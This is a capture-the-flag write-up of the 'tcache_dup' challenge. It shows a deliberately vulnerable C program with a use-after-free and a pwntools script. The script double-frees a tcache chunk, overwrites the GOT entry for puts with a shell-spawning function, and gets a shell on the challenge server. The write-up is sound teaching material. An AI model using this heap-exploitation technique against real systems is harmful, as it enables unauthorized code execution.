# Write-up of the challenge "tcache_dup"

This challenge is part of the "Binary exploitation" category and is in **Level 2**.

# Goal of the challenge

The objective of this challenge is to abuse the **UAF** vulnerability.

## Program structure

```c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler()
{
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt)
{
    int size;

    if (cnt > 10)
    {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt])
    {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete()
{
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10)
    {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    int idx;
    int cnt = 0;

    initialize();

    while (1)
    {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx)
        {
        case 1:
            create(cnt);
            cnt++;
            break;
        case 2:
            delete();
            break;
        default:
            break;
        }
    }

    return 0;
}

```

## Security breach

The vulnerability here is:

- **free(ptr[idx]);**, not setting also the pointer to null.

## Solution

So it was clear that there is a **UAF** vulnerability so what we have to do is just perform `double free`. What will happen is that the freed chunk will point to itself. After freeing it we just make the pointer point to the `GOT puts` and put **8 bytes** to overwrite it's pointer to `get_shell` function which spawns a shell!

solve.py:

```python
from pwn import *
# context.log_level='debug'

elf = ELF('./tcache_dup')
p = remote('host3.dreamhack.games', 22864)
libc = ELF('./libc-2.27.so')

binsh = elf.sym["get_shell"]
puts = elf.got["puts"]


def create(data):
    p.sendline(b'1')
    p.sendlineafter(b'Size: ', b'400')
    p.sendlineafter(b'Data: ', data)


def delete():
    p.sendline(b'2')
    p.sendlineafter(b'idx: ', str(0).encode())


create(b'A' * 8)

delete()
delete()

create(p64(puts))
create(b'A' * 8)
create(p64(binsh))

p.interactive()

```
